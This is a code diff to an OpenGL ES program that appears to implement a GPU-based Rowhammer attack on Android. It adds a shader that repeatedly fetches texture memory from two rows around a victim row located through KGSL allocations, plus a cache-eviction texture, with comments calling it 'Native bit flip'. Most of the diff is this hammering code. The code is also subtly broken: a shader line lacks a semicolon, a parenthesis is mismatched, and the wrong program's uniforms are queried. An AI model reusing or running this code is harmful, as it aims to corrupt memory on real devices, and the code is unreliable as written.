@@ -9,6 +9,9 @@
 #include <sys/stat.h>
 #include <math.h>
 
+#define TXTRNUM (150000)
+#define EVICTTEXT (149999)
+
 EGLDisplay display;
 EGLSurface pBuffer;
 EGLContext ctx;
@@ -73,9 +76,21 @@ const char *fragmentShaderSource = "#version 300 es\n"
     "}\n\0";
 
 const char *hammeringShaderSource = "#version 300 es\n"
-	"uniform sampler2D u_texture;\n"
+	"uniform sampler2D row1;\n"
+	"uniform sampler2D row2;\n"
+	"uniform sampler2D evict1;\n" //  has size of 64 regular pages, needed to evict caches
+	"out vec4 FragColor;\n"
 	"void main(){\n"
-	"	//bla bla blai\n"
+	"	for(int i = 0; i < 2000000; ++i){\n"
+	"		for(int j = 0; j < 64; ++j){\n"
+	"			FragColor = texelFetch(row1, ivec2(j * 16 % 32, j * int(16 / 32), 0);\n"
+	"			FragColor = texelFetch(row2, ivec2(j * 16 % 32, j * int(16 / 32), 0);\n"
+	"		}\n"
+	"		int id = gl_LocalInvocationIndex % 8;\n"
+	"		id = id * 4096\n"
+	"		FragColor = texelFetch(evict1, ivec2(id % 256, int(id / 256)), 0);\n"
+	"		FragColor = texelFetch(evict1, ivec2(id % 256 + 32, int(id / 256)), 0);\n"
+	"	}\n"
 	"}\n\0";
 
 
@@ -159,6 +174,7 @@ int main(){
 	int vertexShader = glCreateShader(GL_VERTEX_SHADER);
 	int fragmentShader = glCreateShader(GL_FRAGMENT_SHADER);
 	GLuint shaderProgram = glCreateProgram();
+	GLuint shaderProgram2 = glCreateProgram();
 	GLuint VAO;
 	GLuint FBF;
 	GLint tex_uniform_location;
@@ -195,7 +211,7 @@ int main(){
 
 	memset(textures_data, 0xff, 4096);
 	memset(readval, 0xaa, 32 * 32 * sizeof(unsigned int));
-	GLuint VBO, tex, tex2[150000];
+	GLuint VBO, tex, tex2[TXTRNUM];
 	// while(1){
 	
 	std::cout<<"Generated value sum==" << rndX + rndY << " ; rndX==" << rndX << "; rndY==" << rndY << "\n";
@@ -249,10 +265,23 @@ int main(){
 		std::cout << "ERROR::FRAMEBUFFER:: Framebuffer is not complete!\n";
 	}
 	uint32_t ttmp = 0;
+
+	// We need this texture for eviction ...
+	glGenTextures(1, &tex2[EVICTTEXT]);
+	glBindTexture(GL_TEXTURE_2D, tex2[EVICTTEXT]);
+	ttmp = ttmp + rndX + rndY;
+	glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, 256, 256, 0, GL_RGBA, GL_UNSIGNED_BYTE, NULL);
+	glTexSubImage2D(GL_TEXTURE_2D, 0, rndX, rndY, 1, 1, GL_RGBA, GL_UNSIGNED_BYTE, &ttmp);
+	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);	
+	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);
+	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST);
+	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_NEAREST);
+
+	// These are common textures ...
 	for(int i = 0; i < 50000; ++i){
 		glGenTextures(1, &tex2[i]);
 		glBindTexture(GL_TEXTURE_2D, tex2[i]);
-		ttmp = ttmp + rndX + rndY;
+		ttmp = ttmp + rndX + rndY; // in case of deduplication (currently not implemented in Android) ...
 		glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, 32, 32, 0, GL_RGBA, GL_UNSIGNED_BYTE, textures_data);
 		glTexSubImage2D(GL_TEXTURE_2D, 0, rndX, rndY, 1, 1, GL_RGBA, GL_UNSIGNED_BYTE, &ttmp);
 		glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);	
@@ -262,7 +291,7 @@ int main(){
 	}
 	// DRAWING
 	glClearColor(0.0f, 0.0f, 0.0f, 0.0f);
-    	glClear(GL_COLOR_BUFFER_BIT);
+    glClear(GL_COLOR_BUFFER_BIT);
 	glUseProgram(shaderProgram);
 	tex_uniform_location = glGetUniformLocation(shaderProgram, "a_rnd");
 	glUniform2f(tex_uniform_location, rndX / 32.f,  rndY / 32.f);
@@ -353,8 +382,78 @@ int main(){
 		fwrite(filebuffer, 1 , 1024, pagemap_csv);
 	};
 	
-	for(size_t i = 1/* I am using first contigious area always for evicting caches */; i < cont_kgsls; ++i){
+
+
+
+	// Native bit flip ...
+
+	fragmentShader = glCreateShader(GL_FRAGMENT_SHADER);
+	glShaderSource(fragmentShader, 1, &hammeringShaderSource, NULL);
+	glCompileShader(fragmentShader);   	
+	glGetShaderiv(fragmentShader, GL_COMPILE_STATUS, &success);
+	if (success != GL_TRUE)
+	{
+		glGetShaderInfoLog(fragmentShader, 512, NULL, infoLog);
+		std::cout << "ERROR::SHADER::FRAGMENT::COMPILATION_FAILED\n" << infoLog << std::endl;
+		exit(1);
+	}
+
+	glAttachShader(shaderProgram, fragmentShader);
+	glLinkProgram(shaderProgram);
+
+	glGetProgramiv(shaderProgram, GL_LINK_STATUS, &success);
+	if (!success) {
+		glGetProgramInfoLog(shaderProgram, 512, NULL, infoLog);
+		std::cout << "ERROR::SHADER::PROGRAM::LINKING_FAILED\n" << infoLog << std::endl;
+		exit(1);
+	}
+	glDeleteShader(fragmentShader);
+
+	for(size_t i = 0; i < cont_kgsls; ++i){
 		// Hammering two rows...
+		// preparing program to run
+		struct kgsl_entry* row1 = kgsl_result[i];
+		for(int j = 0; j < 16; ++j){
+			row1 = row1->kgsl_next;
+		}
+
+		struct kgsl_entry* victim = row1;
+		for(int j = 0; j < 16; ++j){
+			victim = victim->kgsl_next;
+		}
+
+		struct kgsl_entry* row2 = victim;
+		for(int j = 0; j < 16; ++j){
+			row2 = row2->kgsl_next;
+		}
+
+		glClearColor(0.0f, 0.0f, 0.0f, 0.0f);
+		glClear(GL_COLOR_BUFFER_BIT);
+		glUseProgram(shaderProgram2);
+
+
+		// Binding textures
+		GLuint row1TexLocation = glGetUniformLocation(shaderProgram, "row1");
+		GLuint row2TexLocation  = glGetUniformLocation(shaderProgram, "row2");
+		GLuint evictionTexLocation  = glGetUniformLocation(shaderProgram, "evict1");
+
+
+		glUniform1i(row1TexLocation, 0);
+		glUniform1i(row2TexLocation,  1);
+		glUniform1i(evictionTexLocation,  2);
+
+		glActiveTexture(GL_TEXTURE0 + 0); // Row1 Texture Unit
+		glBindTexture(GL_TEXTURE_2D, row1->kgsl_id);
+		
+
+		glActiveTexture(GL_TEXTURE0 + 1); // Row2 Texture Unit
+		glBindTexture(GL_TEXTURE_2D, row2->kgsl_id);
+
+		glActiveTexture(GL_TEXTURE0 + 2); // eviction Texture Unit
+		glBindTexture(GL_TEXTURE_2D, tex2[EVICTTEXT]);
+
+		// running the program
+		glDrawArrays(GL_POINTS, 0, 1);
 		
 	}	
 	printf("RESULT NUMBER IS %u\n", cont_kgsls);
